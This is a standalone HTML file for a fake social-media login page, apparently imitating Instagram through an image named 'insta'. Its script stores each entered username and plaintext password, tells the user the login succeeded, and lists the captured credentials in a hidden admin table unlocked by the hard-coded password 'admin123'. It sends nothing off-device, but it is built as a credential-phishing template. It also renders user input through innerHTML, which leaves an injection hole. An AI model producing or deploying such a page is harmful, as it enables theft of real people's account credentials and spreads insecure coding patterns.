<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SocialConnect - Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0f0f 0%, #050505 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .container {
            background: rgb(12, 12, 12);
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
            width: 100%;
            max-width: 400px;
            position: relative;
        }

        .logo-header {
            padding: 30px;
            text-align: center;
            background: rgb(12, 12, 12);
        }

        .logo-header img {
            max-width: 120px;
            height: auto;
            display: block;
            margin: 0 auto;
        }

        .form-container {
            padding: 40px 30px;
        }

        .form-group {
            margin-bottom: 25px;
            position: relative;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #ffffff;
            font-weight: 500;
        }

        .form-group input {
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s ease;
            background: #f8f9fa;
        }

        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            background: white;
            box-shadow: 0 0 10px rgba(102, 126, 234, 0.1);
        }

        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #1538d6, #3221ce);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-bottom: 15px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .admin-link {
            text-align: center;
            margin-top: 20px;
        }

        .admin-link a {
            color: #667eea;
            text-decoration: none;
            font-size: 14px;
            transition: color 0.3s ease;
        }

        .admin-link a:hover {
            color: #764ba2;
        }

        .social-login {
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e1e5e9;
        }

        .social-btn {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            background: white;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .social-btn:hover {
            border-color: #667eea;
            transform: translateY(-1px);
        }

        /* Admin Panel Styles */
        .admin-panel {
            display: none;
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 800px;
            overflow: hidden;
        }

        .admin-header {
            background: linear-gradient(45deg, #28a745, #20c997);
            color: white;
            padding: 20px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .admin-content {
            padding: 30px;
        }

        .user-table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }

        .user-table th,
        .user-table td {
            padding: 15px;
            text-align: left;
            border-bottom: 1px solid #e1e5e9;
        }

        .user-table th {
            background: #f8f9fa;
            font-weight: 600;
            color: #333;
        }

        .user-table tr:hover {
            background: #f8f9fa;
        }

        .back-btn {
            background: #979ba0;
            padding: 10px 20px;
            border-radius: 5px;
            text-decoration: none;
            color: white;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .back-btn:hover {
            background: #9da2a5;
        }

        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .stat-card {
            background: linear-gradient(45deg, #667eea, #764ba2);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
        }

        .stat-number {
            font-size: 32px;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .alert {
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 10px;
            display: none;
        }

        .alert.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .alert.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        @media (max-width: 200px) {
            .container, .admin-panel {
                margin: 20px;
                max-width: calc(50% - 20px);
            }
            
            .form-container {
                padding: 10px 20px;
            }

            .logo-header img {
                max-width: 80px;
            }
        }
    </style>
</head>
<body>
    <!-- Public Login Page -->
    <div class="container" id="loginPage">
        <div class="logo-header">
            <img src="https://i.postimg.cc/cJyhTqwh/insta.png" alt="insta" id="logoImage">
        </div>

        <div class="form-container">
            <div class="alert" id="loginAlert"></div>
            
            <form id="loginForm">
                <div class="form-group">
                    <label for="username">Username or Email</label>
                    <input type="text" id="username" name="username" required placeholder="Enter your username or email">
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required placeholder="Enter your password">
                </div>
                
                <button type="submit" class="btn">Log in</button>
            </form>
            
            <div class="admin-link">
                <a href="#" onclick="showAdminLogin()">Admin Panel Access</a>
            </div>
        </div>
    </div>

    <!-- Admin Panel -->
    <div class="admin-panel" id="adminPanel">
        <div class="admin-header">
            <h2>Admin Dashboard</h2>
            <a href="#" class="back-btn" onclick="showLogin()">Back to Login</a>
        </div>
        
        <div class="admin-content">
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number" id="totalUsers">0</div>
                    <div>Total Users</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="todayLogins">0</div>
                    <div>Today's Logins</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number" id="socialLogins">0</div>
                    <div>Social Logins</div>
                </div>
            </div>
            
            <h3>User Login Data</h3>
            <table class="user-table">
                <thead>
                    <tr>
                        <th>#</th>
                        <th>Username/Email</th>
                        <th>Password</th>
                        <th>Login Method</th>
                        <th>Timestamp</th>
                        <th>IP Address</th>
                    </tr>
                </thead>
                <tbody id="userTableBody">
                    <!-- User data will be populated here -->
                </tbody>
            </table>
        </div>
    </div>

    <script>
        // In-memory storage for user data (in real app, this would be a database)
        let userData = [];
        let loginAttempts = [];

        // Load existing data if any
        function loadData() {
            const saved = userData;
            if (saved.length > 0) {
                updateAdminPanel();
            }
        }

        // Show admin login prompt
        function showAdminLogin() {
            const adminPassword = prompt("Enter admin password:");
            if (adminPassword === "admin123") {
                showAdminPanel();
            } else {
                showAlert("Invalid admin password!", "error");
            }
        }

        // Show admin panel
        function showAdminPanel() {
            document.getElementById('loginPage').style.display = 'none';
            document.getElementById('adminPanel').style.display = 'block';
            updateAdminPanel();
        }

        // Show login page
        function showLogin() {
            document.getElementById('loginPage').style.display = 'block';
            document.getElementById('adminPanel').style.display = 'none';
        }

        // Handle login form submission
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const timestamp = new Date().toLocaleString();
            const ipAddress = '192.168.1.' + Math.floor(Math.random() * 255); // Simulated IP
            
            // Save user data
            const userEntry = {
                id: userData.length + 1,
                username: username,
                password: password, // Note: In real apps, never store plain text passwords!
                loginMethod: 'Regular Login',
                timestamp: timestamp,
                ipAddress: ipAddress
            };
            
            userData.push(userEntry);
            
            // Show success message
            showAlert("Login successful! Data saved to admin panel.", "success");
            
            // Clear form
            document.getElementById('loginForm').reset();
            
            // Update admin stats
            updateAdminPanel();
        });

        // Handle social login
        function socialLogin(platform) {
            const timestamp = new Date().toLocaleString();
            const ipAddress = '192.168.1.' + Math.floor(Math.random() * 255);
            
            // Simulate social login data
            const userEntry = {
                id: userData.length + 1,
                username: `user_${platform}_${Date.now()}`,
                password: '[Social Login - No Password]',
                loginMethod: `${platform.charAt(0).toUpperCase() + platform.slice(1)} Login`,
                timestamp: timestamp,
                ipAddress: ipAddress
            };
            
            userData.push(userEntry);
            
            showAlert(`${platform.charAt(0).toUpperCase() + platform.slice(1)} login successful!`, "success");
            updateAdminPanel();
        }

        // Show alert messages
        function showAlert(message, type) {
            const alert = document.getElementById('loginAlert');
            alert.textContent = message;
            alert.className = `alert ${type}`;
            alert.style.display = 'block';
            
            setTimeout(() => {
                alert.style.display = 'none';
            }, 3000);
        }

        // Update admin panel with current data
        function updateAdminPanel() {
            // Update statistics
            document.getElementById('totalUsers').textContent = userData.length;
            
            const today = new Date().toDateString();
            const todayLogins = userData.filter(user => 
                new Date(user.timestamp).toDateString() === today
            ).length;
            document.getElementById('todayLogins').textContent = todayLogins;
            
            const socialLogins = userData.filter(user => 
                user.loginMethod !== 'Regular Login'
            ).length;
            document.getElementById('socialLogins').textContent = socialLogins;
            
            // Update user table
            const tableBody = document.getElementById('userTableBody');
            tableBody.innerHTML = '';
            
            userData.forEach(user => {
                const row = tableBody.insertRow();
                row.innerHTML = `
                    <td>${user.id}</td>
                    <td>${user.username}</td>
                    <td>${user.password}</td>
                    <td>${user.loginMethod}</td>
                    <td>${user.timestamp}</td>
                    <td>${user.ipAddress}</td>
                `;
            });
        }

        // Initialize the application
        loadData();

        // Add some sample data for demonstration
        setTimeout(() => {
            if (userData.length === 0) {
                // Add sample entries
                userData.push({
                    id: 1,
                    username: 'demo_user',
                    password: 'demo123',
                    loginMethod: 'Regular Login',
                    timestamp: new Date().toLocaleString(),
                    ipAddress: '192.168.1.100'
                });
                
                userData.push({
                    id: 2,
                    username: 'social_user_facebook',
                    password: '[Social Login - No Password]',
                    loginMethod: 'Facebook Login',
                    timestamp: new Date().toLocaleString(),
                    ipAddress: '192.168.1.101'
                });
                
                updateAdminPanel();
            }
        }, 1000);
    </script>
</body>
</html>
